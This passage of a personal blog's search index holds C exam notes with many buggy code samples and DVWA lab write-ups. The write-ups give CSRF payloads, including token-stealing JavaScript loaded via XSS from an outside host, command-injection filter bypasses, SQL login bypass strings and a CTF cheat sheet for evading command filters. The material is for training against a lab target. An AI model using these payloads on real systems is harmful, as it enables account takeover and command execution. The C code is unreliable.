i=1;i&lt;size;i++)&#123;if (arr[]&lt;min)&#123;min = arr[i];&#125;if (arr[i]&gt;max)&#123;max=arr[i];&#125;&#125;&#125; 实现简单的计算器（+-x&#x2F;）#include &lt;stdio.h&gt;int add (int a,int b)&#123;return a+b;&#125;int subtract(int a,int b)&#123;return a-b;&#125;int multiply(int a,int b)&#123;return a*b;&#125;int divide(int a,int b)&#123;if (b!=0)&#123;return(float)a/b;&#125;return -1;&#125;int main()&#123;char expr[100];int mun1,num2;char op;printf(&quot;请输入表达式&quot;);scanf(&quot;%s&quot;,expr);scanf(expr&quot;%d %c %d&quot;,&amp;num1,&amp;op,&amp;num2);switch(op)&#123;case &#x27;+&#x27;:printf(&quot;%d+%d=%d\\n&quot;,num1,num2,add(num1,num2));break;case &#x27;-&#x27;:printf(&quot;%d-d=%d\\n&quot;,num1,num2,subtract(num1,num2));break;case &#x27;*&#x27;:printf(&quot;%d*%d=%d\\n&quot;num1,num2, multiply(num1,num2));break;case &#x27;/&#x27;:printf(&quot;%d/%d=%.2f\\n&quot;,num1,num2,divide(num1,num2);break;default:printf(&quot;非法运算符\\n);break;&#125;return 0;&#125; 冒泡排序学生总成绩#include &lt;stdio.h&gt;#define MAX_N 100struct Student&#123; char name[20]; char id[10]; float ma,ch,total;&#125; stu[MAX_N];void main()&#123; int n=4,i,j; printf(&quot;请输入学生人数n=\\n&quot;); scanf(&quot;%d&quot;,&amp;n); printf(&quot;请输入学生信息:\\n&quot;); for(i=0;i&lt;n;i++)&#123; scanf(&quot;%s %s %f %f&quot;, &amp;stu[i].name,&amp;stu[i].id,&amp;stu[i].ma,&amp;stu[i].ch); stu[i].total=(stu[i].ma+stu[i].ch)/2; &#125; for(i=0;i&lt;n-1;i++)&#123; for(j=0;j&lt;n-1-i;j++)&#123; if(stu[j].total&gt;stu[j+1].total)&#123; struct Student mid; mid=stu[j]; stu[j]=stu[j+1]; stu[j+1]=mid; &#125; &#125; &#125; for(i=0;i&lt;n;i++) printf(&quot;%s %s %.2f\\n&quot;, stu[i].name,stu[i].id,stu[i].total);&#125;","categories":[{"name":"c","slug":"c","permalink":"https://mengnankk.top/categories/c/"}],"tags":[{"name":"c","slug":"c","permalink":"https://mengnankk.top/tags/c/"}]},{"title":"C语言期末复习1","slug":"dayc1","date":"2023-12-01T16:00:00.000Z","updated":"2024-06-06T06:11:11.968Z","comments":true,"path":"2023/12/02/dayc1/","permalink":"https://mengnankk.top/2023/12/02/dayc1/","excerpt":"","text":"c语言期末复习辅助知识点总复习1.程序结构是三种，顺序结构，循环结构，选择结构， 2.读取程序都需要在main()函数入口，然后从上往下读，直到主函数结束。 3.计算机中的数据是以二进制的形式保存的，存放的位置就是他的地址，地址是十六进制的 4.运算符的优先级：单目运算符&gt;双目运算符&gt;三目运算符，算术运算符&gt;关系运算符&gt;逻辑运算符&gt;赋值运算符,逗号运算符的级别最低。 常见基础知识普遍1.标识符必须有字母数字下划线组成，并且第一个字符必须为字母或者数字。 2.不能用main define sacnf等作为标识符 3.c语言的八进制要以0开头，十六进制要以0x开头。 4.小数的合法写法：1.0可以写成1 0.1可以写成.1 5.e前e后必须有数，e后必为整数。 6.long int x 表示x是长类型 unsignde int x 标识x是无符号类型 表达式：1.算数表达式： ”&#x2F;“两边都是整形，那么结果就是一个整数（四舍五入） ”&#x2F;“如果有一边为小数，那么结果就是小数 ”%“注意是取余数，两边的要求是整数。 2.赋值表达式 不能连续赋值 赋值的左边只能是一个表达式 3.自加表达式 ++在前先加后用，，++在后先用后加（–类似0 4.逗号表达式 优先级别最低 5.三种取整丢小数的情况 int a&#x3D;1.6; (int)a; 1&#x2F;2;3&#x2F;2 6.定义宏常量：#define 标识符 字符串加分号 #define PI 3.14159定义pi 定义const常量： const 数据类型 标识符字符串 const int MAX_VALUE = 100;在这个例子中，MAX_VALUE就是一个const常量，它的数据类型为int，值为100。在程序中可以直接使用MAX_VALUE来代表这个值，而不需要担心其被修改。 字符重要：大写字母和小写字母转换的方法‘A’+32&#x3D;’a’ 相互之间一般差32 转移字符（重要） \\n换行 \\0空字符 注：字符型（char)和整数(int)是近亲:有着相似的地方 char a&#x3D;65 printf(“%c”,a);得到a printf(“%d”,A);得到65 键盘输入和屏幕输出：getchar()用于字符输入 putchar（）用于字符输出 printf（）用于输出数据 scanf()用于输入数据 选择结构1.if（）语句后面不加分号 2.单支if() 双支if else 多分支if if else() else if ()&#123;......;&#125; 3.switch语句 switch()&#123;case 1:.....;break&#125; 一般需要break使其跳出循环，否则将会按照顺序往下继续进行 循环结构1.while while()&#123;......;&#125; 执行过程： 1.计算循环控制表达式的值;2.如果循环表达式的值为真，那么就执行循环体中的语句，并返回while重新开始判断3.如果循环控制表达式的值为假，就退出循环，执行循环体后面的语句。 2.do-while do&#123;.....;&#125;while(); 执行过程： 1.执行循环体中的语句;2.计算循环控制表达式的值;3.如果循环控制表达式的值为真，那么返回继续执行4.如果循环控制表达式的值为假，就退出循环，执行循环体后面的语句。 3.for for(初始化表达式;循环控制表达试;增值表达式)&#123;语句序列&#125; 4.注意：使用合适的循环结构，①如果循环次数已知，计数控制的循环，用for语句。②如果循环次数未知，条件控制的循环，用while语句③如果循环体至少要执行一次，用do–while语句。 数组定义并初始化数组存放五个字符： char a[5]=&#123;&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;&#125;; 存放一个字符： char a[5]=&quot;abcd&quot;; 二维数组初始化： char a[3][4]=&#123;&quot;abc&quot;,&quot;cv&quot;,&quot;rty&quot;&#125;; 输入字符串1.scanf(“%s”,字符串名称)； scanf(“%s%s%s”,s1,s2,s3); 2.get get(字符串名称); 只能输入一个字符串，从光标开始到换行符，也就是说读入的是一整行。例如输入Hello World！获取的是Hello World! 输出字符串1.printf(“%s”,字符串名称)； 输出项只能是字符串的名称，不能是数组元素。输出字符串不包括字符串结束标识符\\0 2.put puts(字符串名称)； puts输出一个字符串和一个换行符 函数函数，函数对形参做处理，结果以return语句形式返回。对函数定义时要加函数类型和实参类型，但函数调用时实参不带类型。 补充：常见内容的运用交换排序int i,j,temp,n,a[1000];for (i=0;i&lt;n-1;i++)&#123;for (j=i+1;j&lt;n;j++)&#123;if (a[j]&gt;a[i])&#123;temp=a[j];a[j]=a[i];a[i]=temp;&#125;&#125;&#125; 选择排序int i,j,k,temp;for (i=0;i&lt;n-1;i++)&#123;k=1for(j=i+1;j&lt;n;j++)&#123;if (a[j]&lt;a[k])&#123;k=j&#125;&#125;if (k!=i)&#123;temp=a[k];a[k]=a[i];a[k]=temp;&#125;&#125; 插入排序int i,l,temp,a[num];for (i=1;i&lt;num;i++)&#123;l=i-1;temp=a[i];while(l&gt;=0&amp;&amp;a[l]&gt;temp)&#123;a[l+1]=a[l];l--;a[l+1]=temp;&#125;&#125; 冒泡排序void bubble_sort(int arr[],int size)&#123;int i,j,temp;for (i=0;i&lt;size-1;i++)&#123;int count = 0;for (j=0;j&lt;size-1;j++)&#123;if (arr[j]&gt;arr[j+1])&#123;tmep=arr[j];arr[j+1]=arr[j];arr[j+1]=temp;count=1&#125;&#125;if (count==0)break;&#125;&#125; 查找int low,high,a[n],mid,temp;low=0,high=n-1,mid=0;while(low&lt;=high)&#123;mid=(low+high)/2;if (a[mid]&gt;temp)&#123;high=mid-1;else if (a[mid]&lt;temp)&#123;low=mid+1;else&#123;cout&lt;&lt;a[mid]&lt;&lt;endl;&#125;&#125;&#125;cout&lt;&lt;&quot;not found!&quot;&lt;&lt;endl&#125;","categories":[{"name":"c","slug":"c","permalink":"https://mengnankk.top/categories/c/"}],"tags":[{"name":"c","slug":"c","permalink":"https://mengnankk.top/tags/c/"}]},{"title":"dvwa FI","slug":"day77777","date":"2023-11-29T16:00:00.000Z","updated":"2024-06-06T06:11:08.133Z","comments":true,"path":"2023/11/30/day77777/","permalink":"https://mengnankk.top/2023/11/30/day77777/","excerpt":"","text":"File Inclusion 文件包含简介文件包含漏洞：即File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。服务器通过php的特性（函数）去包含任意文件时，由于要包含的这个文件来源过滤不严，从而可以去包含一个恶意文件，而我们可以构造这个恶意文件来达到自己的目的。","categories":[{"name":"web dvwa","slug":"web-dvwa","permalink":"https://mengnankk.top/categories/web-dvwa/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://mengnankk.top/tags/dvwa/"}]},{"title":"dvwa CSRF","slug":"day666","date":"2023-11-27T16:00:00.000Z","updated":"2024-06-06T06:10:55.043Z","comments":true,"path":"2023/11/28/day666/","permalink":"https://mengnankk.top/2023/11/28/day666/","excerpt":"","text":"CSRF（跨站请求伪造）简介CSRF（跨站请求伪造），全称为Cross-site request forgery，简单来说，是攻击者利用受害者尚未失效的身份认证信息，诱骗受害者点击恶意链接或含有攻击代码的页面，在受害者不知情的情况下以受害者的身份像服务器发起请求，从而实现非法攻击（改密）。 low源代码 &lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Get input//获取两个输入框的密码 $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match?//查看两次输入的是否一致 if( $pass_new == $pass_conf ) &#123; // They do!//如果一致就直接插入数据库 $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 通过GET方式获取两次密码，两次密码输入一致的话，就可以直接带入数据中修改密码。 攻击方式： 经过上面的尝试发现可以成功修改账号密码，而且我们发现了URL那里的变化，接下来我们从URL处入手再改一下，首先先重置一下数据库，把密码改回来。 在 C:\\phpstudy_pro\\WWW 文件夹中建立一个 1.html ，里面写入 &lt;img src=&quot;http://127.0.0.3/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt;&lt;h1&gt;404&lt;h1&gt;&lt;h2&gt;file not found.&lt;h2&gt; 这样的话，当我们打开 1.html 文件的时候，密码就会被修改成123456，（诱骗受害者点击这个1.html文件，放个诱惑链接） 诱骗链接 http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change# 但是一般有一些智商的都不会点击，所以可以将长链接转为短链接，可以使用https://tool.chinaz.com/tools/dwz.aspx来生成短链接。 或者配合xss一块使用 新建一个带有xss攻击的hmtl的页面 &lt;html&gt;&lt;head&gt; &lt;title&gt;XSS&amp;CSRF&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script src=&quot;http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=222&amp;password_conf=222&amp;Change=Change#&quot;&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 当受害者访问127.0.0.1&#x2F;xss.hmtl的时候，密码就被修改成了222 hmtl的核心语句就是通过scirpt标签的src属性来记载攻击的url &lt;script src=&quot;http://127.0.0.1:8888/vulnerabilities/csrf/?password_new=222&amp;password_conf=222&amp;Change=Change#&quot;&gt;&lt;/script&gt; Medium源代码 &lt;?phpif( isset( $_GET[ &#x27;Change&#x27; ] ) ) &#123; // Checks to see where the request came from//stripos(str1, str2)检查str2在str1中出现的位置（不区分大小写)，如果有返//回True，反之False//判断Host字段是否出现在referer字段中 if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) &#123; // Get input $pass_new = $_GET[ &#x27;password_new&#x27; ]; $pass_conf = $_GET[ &#x27;password_conf&#x27; ]; // Do the passwords match? if( $pass_new == $pass_conf ) &#123; // They do! $pass_new = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass_new ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;)); $pass_new = md5( $pass_new ); // Update the database $insert = &quot;UPDATE `users` SET password = &#x27;$pass_new&#x27; WHERE user = &#x27;&quot; . dvwaCurrentUser() . &quot;&#x27;;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $insert ) or die( &#x27;&lt;pre&gt;&#x27; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#x27;&lt;/pre&gt;&#x27; ); // Feedback for the user echo &quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;; &#125; else &#123; // Issue with passwords matching echo &quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;; &#125; &#125; else &#123; // Didn&#x27;t come from a trusted source echo &quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);&#125;?&gt; 由上面的代码可知增加了referer判断 if( stripos( $_SERVER[ &#x27;HTTP_REFERER&#x27; ] ,$_SERVER[ &#x27;SERVER_NAME&#x27; ]) !== false ) 即如果 HTTP_REFERER 和 SERVER_NAME 不是来自同一个域的话就无法进行到循环内部，执行修改密码的操作。 所以我们需要手动伪造referer来执行CSRF攻击 我们要手动制作一个html表单 &lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;utf-8&quot;&gt; &lt;title&gt;CSRF&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method=&quot;get&quot; id=&quot;csrf&quot; action=&quot;http://127.0.0.1:8888/vulnerabilities/csrf/&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_new&quot; value=&quot;222&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;password_conf&quot; value=&quot;222&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;Change&quot; value=&quot;Change&quot;&gt;&lt;/form&gt;&lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt;&lt;/body&gt;&lt;/html&gt; &lt;script&gt; document.forms[&quot;csrf&quot;].submit(); &lt;/script&gt; 通过自动触发提交id为csrf的表单 使用方法： 1.将上述 html 页面放到服务器的 127.0.0.1 目录下，然后让用户访问自动触发提交然后访问构造好的 payload 地址： http://www.mengnankk.top/127.0.0.1/csrf.html 2.或者将上述html文件命名为127.0.0.1html然后访问 http://www.mengnankk.top/127.0.0.1.html 这里有一个小细节，如果目标网站是 http 的话，那么 csrf 的这个 html 页面也要是 http 协议，如果是 https 协议的话 就会失败。 3.因为？后默认当做参数传递，这里因为 html 页面是不能接受参数的，所以随便输入是不影响实际的结果的，利用这个特点来绕过 referer 的检测。 http://www.mengnankk.top/csrf.html?127.0.0.1 HIGH检查一下源代码，防线多了个token # 检测用户的 user_tokencheckToken( $_REQUEST[ &#x27;user_token&#x27; ], $_SESSION[ &#x27;session_token&#x27; ], &#x27;index.php&#x27; ); 相对于 Low 级别，实际上就是增加了一个 token 检测，这样我们 CSRF 攻击的时候必须知道用户的 token 才可以成功。 通关思路：使用 XSS 来获取用户的 token ，然后将 token 放到 CSRF 的请求中。因为 HTML 无法跨域，这里我们尽量使用原生的 JS 发起 HTTP 请求才可以。 1.首先新建csrf.js // 首先访问这个页面 来获取 tokenvar tokenUrl = &#x27;http://127.0.0.1:8888/vulnerabilities/csrf/&#x27;;if(window.XMLHttpRequest) &#123; xmlhttp = new XMLHttpRequest();&#125;else&#123; xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);&#125;var count = 0;xmlhttp.withCredentials = true;xmlhttp.onreadystatechange=function()&#123; if(xmlhttp.readyState ==4 &amp;&amp; xmlhttp.status==200) &#123; // 使用正则提取 token var text = xmlhttp.responseText; var regex = /user_token\\&#x27; value\\=\\&#x27;(.*?)\\&#x27; \\/\\&gt;/; var match = text.match(regex); var token = match[1]; // 发起 CSRF 请求 将 token 带入 var new_url = &#x27;http://127.0.0.1:8888/vulnerabilities/csrf/?user_token=&#x27;+token+&#x27;&amp;password_new=111&amp;password_conf=111&amp;Change=Change&#x27;; if(count==0)&#123; count++; xmlhttp.open(&quot;GET&quot;,new_url,false); xmlhttp.send(); &#125; &#125;&#125;;xmlhttp.open(&quot;GET&quot;,tokenUrl,false);xmlhttp.send(); 然后将文件放在外网的服务器上，然后访问网页，直接发起xss测试，这里直接通过 script 标签的 src 来引入外部 js，访问之后此时密码就被更改为 111 了 http://127.0.0.1:8888/vulnerabilities/xss_d/?default=English&amp;a=&lt;/option&gt;&lt;/select&gt;&lt;script src=&quot;http://www.sqlsec.com/csrf.js&quot;&gt;&lt;/script&gt;","categories":[{"name":"web dvwa","slug":"web-dvwa","permalink":"https://mengnankk.top/categories/web-dvwa/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://mengnankk.top/tags/dvwa/"}]},{"title":"dvwa CE","slug":"day999","date":"2023-11-27T16:00:00.000Z","updated":"2024-06-06T06:11:04.681Z","comments":true,"path":"2023/11/28/day999/","permalink":"https://mengnankk.top/2023/11/28/day999/","excerpt":"","text":"简介：Command Injection（命令注入），就是指通过提交一些恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。 Low源代码 &lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // 确定操作系统并执行ping命令 if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125; 通过代码可以发现，服务器仅仅只是判断了不同的操作系统执行不同的命令，并没有做其他的限制 注：操作符的使用 A;B A 不论正确与否都会执行 B 命令A&amp;B A 后台运行，A 和 B 同时执行A&amp;&amp;B A 执行成功时候才会执行 B 命令A|B A 执行的输出结果，作为 B 命令的参数，A 不论正确与否都会执行 B 命令A||B A 执行失败后才会执行 B 命令 运行127.0.0.1&amp;ls查看目录 Medium源代码 &lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = $_REQUEST[ &#x27;ip&#x27; ]; // Set blacklist//设置命令黑名单，里面包含&amp;&amp;和； $substitutions = array( &#x27;&amp;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist).//将参数中有&amp;&amp;和；的都替换成空 $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 从源码中可以看出，相比于Low难度，增加了黑名单，将 “&amp;&amp;”，”;” 做了限制，将其改成空格，但是别的没有什么改变，在这里依旧可以通过 127.0.0.1 &amp; ipconfig 来绕过 High源代码 &lt;?phpif( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123; // Get input $target = trim($_REQUEST[ &#x27;ip&#x27; ]); // Set blacklist//设置命令黑名单，里面包含&amp; ；| - $ ( ) \\ &#x27; || $substitutions = array( &#x27;&amp;&#x27; =&gt; &#x27;&#x27;, &#x27;;&#x27; =&gt; &#x27;&#x27;, &#x27;| &#x27; =&gt; &#x27;&#x27;, &#x27;-&#x27; =&gt; &#x27;&#x27;, &#x27;$&#x27; =&gt; &#x27;&#x27;, &#x27;(&#x27; =&gt; &#x27;&#x27;, &#x27;)&#x27; =&gt; &#x27;&#x27;, &#x27;`&#x27; =&gt; &#x27;&#x27;, &#x27;||&#x27; =&gt; &#x27;&#x27;, ); // Remove any of the charactars in the array (blacklist).//替换成空 $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); // Determine OS and execute the ping command. if( stristr( php_uname( &#x27;s&#x27; ), &#x27;Windows NT&#x27; ) ) &#123; // Windows $cmd = shell_exec( &#x27;ping &#x27; . $target ); &#125; else &#123; // *nix $cmd = shell_exec( &#x27;ping -c 4 &#x27; . $target ); &#125; // Feedback for the end user echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;&#125;?&gt; 看到代码，发现黑名单中的限制更多了，像 ‘&amp;’，’| ‘，’||’，’;’，’$’ 等许多都加了限制，但是要仔细观察 ，比如说这个 ‘| ‘ ，它是在管道符后面加了个空格，因此考虑使用 127.0.0.1 |ipconfig 来绕过","categories":[{"name":"web dvwa","slug":"web-dvwa","permalink":"https://mengnankk.top/categories/web-dvwa/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://mengnankk.top/tags/dvwa/"}]},{"title":"dvwa BF","slug":"day333","date":"2023-11-26T16:00:00.000Z","updated":"2024-06-06T06:10:51.029Z","comments":true,"path":"2023/11/27/day333/","permalink":"https://mengnankk.top/2023/11/27/day333/","excerpt":"","text":"Brute Force 暴力破解low1.手工注入 万能密码 admin ‘ or ‘1’&#x3D;’1 2.直接bp爆破 welcome to dvwa Medium这个跟low差不多 只是增加了mysqli_real_escape_string()函数 这个函数会过滤一些特殊的符号 抵御一部分sql注入 ps:mysqli_real_escape_string()函数的作用是对字符串中的特殊字符进行转义，以防止SQL注入攻击。它将字符串中的特殊字符（如单引号、双引号、反斜杠等）转义为它们的转义序列，从而使其在SQL语句中不被误解为SQL命令的一部分。这样可以确保用户输入的数据不会破坏SQL查询语句的结构，同时保护数据库的安全性。 High这一关的区别在于token 注：Token是在客户端频繁向服务端请求数据，服务端频繁的去数据库查询用户名和密码并进行对比，判断用户名和密码正确与否，并作出相应提示，在这样的背景下，Token便应运而生。Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。Token的目的是为了减轻服务器的压力，减少频繁的查询数据库，使服务器更加健壮。","categories":[{"name":"web dvwa","slug":"web-dvwa","permalink":"https://mengnankk.top/categories/web-dvwa/"}],"tags":[{"name":"dvwa","slug":"dvwa","permalink":"https://mengnankk.top/tags/dvwa/"}]},{"title":"CTF中命令执行绕过方法","slug":"day6","date":"2023-11-22T16:00:00.000Z","updated":"2024-06-06T06:10:42.982Z","comments":true,"path":"2023/11/23/day6/","permalink":"https://mengnankk.top/2023/11/23/day6/","excerpt":"","text":"命令执行绕过escapeshellcmd函数绕过方法：1.执行.bat文件的时候，利用%1a，可以绕过过滤执行命令。 payload&#x3D; post=../ %1a whoami 2.宽字节注入 空格过滤：1.${IFS} payload1&#x3D; cat$&#123;IFS&#125;flag payload2&#x3D; cat$&#123;IFS&#125;$9flag payload3&#x3D; cat$IFS$9flag 2.重定向符&lt;&gt; payload1&#x3D; cat&lt;&gt;flag payload2&#x3D; cat&lt;flag 黑名单绕过1.拼接 payload&#x3D; a=c;b=at;c=flag;$a$b $c 2.利用已存在的资源 从已有的文件或者环境变量中获得相应的字符。 3.base64编码 `echo &quot;Y2F0IGZsYWc=&quot;|base64 -d` echo &quot;Y2F0IGZsYWc=&quot;|base64 -d|bash 4.单引号、双引号 payload1&#x3D; c&quot;&quot;at flag payload2&#x3D; c&quot;&quot;at fl&quot;&quot;ag payload3&#x3D; c&quot;&quot;at fl&#x27;&#x27;ag 5.反斜线 \\ payload&#x3D; c\\at fl\\ag 6.LINUX下一些已有字符 ${PS2} 对应字符 ‘&gt;’ ${PS4} 对应字符 ‘+’ ${IFS} 对应 内部字段分隔符 ${9} 对应 空字符串","categories":[{"name":"web php","slug":"web-php","permalink":"https://mengnankk.top/categories/web-php/"}],"tags":[{"name":"php","slug":"php","permalink":"https://mengnankk.top/tags/php/"}]},{"title":"xss攻击基础了解","slug":"day7","date":"2023-11-22T16:00:00.000Z","updated":"2024-06-06T06:10:46.710Z","comments":true,"path":"2023/11/23/day7/","permalink":"https://mengnankk.top/2023/11/23/day7/","excerpt":"","text":"XSS攻击XSS的了解跨站脚本攻击（Cross-site scripting，XSS）是一种安全漏洞，攻击者可以利用这种漏洞在网站上注入恶意的客户端代码。若受害者运行这些恶意代码，攻击者就可以突破网站的访问限制并冒充受害者。根据开放式 Web 应用安全项目（OWASP），XSS 在 2017 年被认为 7 种最常见的 Web 应用程序漏洞之一。 如果 Web 应用程序没有部署足够的安全验证，那么，这些攻击很容易成功。浏览器无法探测到这些恶意脚本是不可信的，所以，这些脚本可以任意读取 cookie，session tokens，或者其他敏感的网站信息，或者让恶意脚本重写HTML内容。 在以下 2 种情况下，容易发生 XSS 攻击： 数据从一个不可靠的链接进入到一个 Web 应用程序。 没有过滤掉恶意代码的动态内容被发送给 Web 用户。 恶意内容一般包括 JavaScript，但是，有时候也会包括 HTML，FLASH 或是其他浏览器可执行的代码。XSS 攻击的形式千差万别，但他们通常都会：将 cookies 或其他隐私信息发送给攻击者，将受害者重定向到由攻击者控制的网页，或是经由恶意网站在受害者的机器上进行其他恶意操作。 XSS 攻击可以分为 3 类：存储型（持久型）、反射型（非持久型）、DOM 型。 存储型 XSS 注入型脚本永久存储在目标服务器上。当浏览器请求数据时，脚本从服务器上传回并执行。 反射型 XSS 当用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。Web 服务器将注入脚本，比如一个错误信息，搜索结果等 返回到用户的浏览器上。由于浏览器认为这个响应来自”可信任”的服务器，所以会执行这段脚本。 基于 DOM 的 XSS 通过修改原始的客户端代码，受害者浏览器的 DOM 环境改变，导致有效载荷的执行。也就是说，页面本身并没有变化，但由于 DOM 环境被恶意修改，有客户端代码被包含进了页面，并且意外执行。 原理XSS和SQLI、RCE本质上都是注入类漏洞，核心要义都是构造payload逃逸程序原有的处理逻辑进而欺骗目标系统执行恶意代码。 XSS将恶意代码注入到网页中，使用户加载并执行攻击者恶意制造的网页程序。恶意代码通常是JavaScript、Java组件，VBScript，ActiveX，Flash或者就是原生的HTML。","categories":[{"name":"web xss","slug":"web-xss","permalink":"https://mengnankk.top/categories/web-xss/"}],"tags":[{"name":"host","slug":"host","permalink":"https://mengnankk.top/tags/host/"}]},{"title":"web day2","slug":"day3","date":"2023-11-19T16:00:00.000Z","updated":"2024-06-06T06:10:28.173Z","comments":true,"path":"2023/11/20/day3/","permalink":"https://mengnankk.top/2023/11/20/day3/","excerpt":"","text":"http协议与https协议http简介1.HTTP 协议是 Hyper Text Transfer Protocol（超文本传输协议）的缩写，是用于从万维网（ WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议. 2.http协议是基于tcp&#x2F;ip协议来传输数据（html文件、图片文件、查询结果等） 3.http的url是由http:&#x2F;&#x2F;起始，默认使用端口为80 http工作原理1.http协议工作于客户端-服务器架构上 2.浏览器作为http客户端通过url向http服务端即web服务器发送所有的请求。 3.web服务器接受到请求后，向客户端发送响应信息 4.http的默认端口号为80，但可以改为其他的端口 http协议的工作原理示意图 https简介https经由http进行通信，但是利用ssl&#x2F;tls来加密数据包，https的开发的主要目的是提供对网站服务器的身份认证，保护交换资料的隐私和完整性。 https的url是由https:&#x2F;&#x2F;起始，默认端口为443 https的作用信任的情况： 与一个网站之间的 HTTPS 连线仅在这些情况下可被信任： 浏览器正确地实现了 HTTPS 且操作系统中安装了正确且受信任的证书颁发机构； 证书颁发机构仅信任合法的网站； 被访问的网站提供了一个有效的证书，也就是说它是一个由操作系统信任的证书颁发机构签发的（大部分浏览器会对无效的证书发出警告）；（可以人为的添加证书，如bp的使用则需要人为的给浏览器添加证书） 该证书正确地验证了被访问的网站（例如，访问 https://www.runoob.com 时收到了签发给 www.runoob.com 而不是其它域名的证书）； 此协议的加密层（SSL&#x2F;TLS）能够有效地提供认证和高强度的加密。","categories":[{"name":"web 